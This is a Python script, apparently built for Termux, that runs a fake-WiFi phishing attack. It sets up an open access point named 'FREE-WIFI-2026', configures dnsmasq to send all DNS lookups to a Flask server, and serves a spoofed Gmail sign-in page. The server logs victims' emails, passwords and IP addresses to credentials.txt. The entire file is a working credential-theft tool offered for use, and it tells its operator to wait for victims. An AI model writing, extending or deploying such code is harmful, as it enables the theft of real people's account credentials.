#!/usr/bin/env python3
import subprocess
import threading
import time
import os
from flask import Flask, request, render_template_string
import urllib.parse

app = Flask(__name__)

# HTML Phishing Page
PHISH_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; background: #4285f4; margin: 0; padding: 20px; }
        .login-box { background: white; max-width: 400px; margin: 50px auto; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.3); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 100px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #4285f4; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <img src="https://www.gstatic.com/images/branding/product/1x/gmail_48dp.png" alt="Gmail">
        </div>
        <h2>Sign in to continue to WiFi</h2>
        <form method="POST" action="/login">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
        <div class="footer">To use this WiFi, you must sign in first</div>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(PHISH_PAGE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    
    # Log credentials
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] Gmail: {email} | Pass: {password} | IP: {request.remote_addr}\n"
    
    with open('credentials.txt', 'a') as f:
        f.write(log_entry)
    
    print(f"\n🎣 CAPTURED: {email}:{password} from {request.remote_addr}")
    
    # Redirect to fake success page
    return '''
    <html><head><title>Success</title></head>
    <body style="background:#4285f4;color:white;text-align:center;padding:50px;">
        <h1>✅ Connected to WiFi!</h1>
        <p>Enjoy unlimited internet access</p>
    </body></html>
    '''

def start_phishing_server():
    print("🚀 Starting phishing server on port 80...")
    app.run(host='0.0.0.0', port=80, debug=False)

def create_fake_ap():
    print("📡 Creating fake WiFi AP...")
    
    # Kill any existing hostapd
    subprocess.run(['pkill', 'hostapd'], shell=False)
    
    # Create hostapd config
    hostapd_conf = '''interface=wlan0
driver=nl80211
ssid=FREE-WIFI-2026
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
'''
    
    with open('hostapd.conf', 'w') as f:
        f.write(hostapd_conf)
    
    # Start hostapd (non-root method using termux services if available)
    # For no-root: we'll use dnsmasq + manual IP setup
    print("⚠️  No-root mode: Manual client connection required")

def start_dnsmasq():
    dnsmasq_conf = '''interface=wlan0
dhcp-range=192.168.4.2,192.168.4.20,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
address=/#/192.168.4.1
'''
    
    with open('dnsmasq.conf', 'w') as f:
        f.write(dnsmasq_conf)
    
    subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])

if __name__ == "__main__":
    print("🔥 Fake WiFi Gmail Phisher Starting...")
    print("📱 No-root Termux setup")
    
    # Start phishing server in thread
    server_thread = threading.Thread(target=start_phishing_server)
    server_thread.daemon = True
    server_thread.start()
    
    # Setup fake AP components
    create_fake_ap()
    
    print("\n✅ Setup complete!")
    print("📡 Broadcast SSID: FREE-WIFI-2026")
    print("🌐 Phishing: http://192.168.4.1")
    print("📝 Credentials saved to: credentials.txt")
    print("\n⏳ Wait for victims to connect...")
    
    # Keep alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Stopping...")
